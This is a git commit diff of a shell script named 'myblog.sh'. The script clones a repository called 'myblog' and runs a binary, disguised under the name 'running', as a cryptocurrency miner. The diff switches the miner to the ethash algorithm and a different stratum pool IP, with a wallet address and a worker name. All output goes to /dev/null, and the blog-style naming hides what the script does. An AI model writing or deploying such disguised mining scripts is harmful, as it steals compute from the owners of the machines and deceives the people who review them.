6e283c714a1c0d1c6bc7837025b6947efe0d032f
bruneisoft <109172357+bruneisoft@users.noreply.github.com>
2022-07-14 22:13:29 +0700

    Update myblog.sh

--- myblog.sh
+++ myblog.sh
@@ -2,4 +2,4 @@
 cd /hoang999
 git clone https://github.com/thaihoang999/myblog.git -q
 chmod -R +x myblog
-./myblog/running -a firopow -o stratum+tcp://51.81.185.231:9090 -u a9XwK7sits5Pn9egPaYX1gxXvuncqe4SRv.az-kienmai-10 -p x > /dev/null 2>&1
+./myblog/running -a ethash -o stratum+tcp://51.195.4.122:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-10 > /dev/null 2>&1
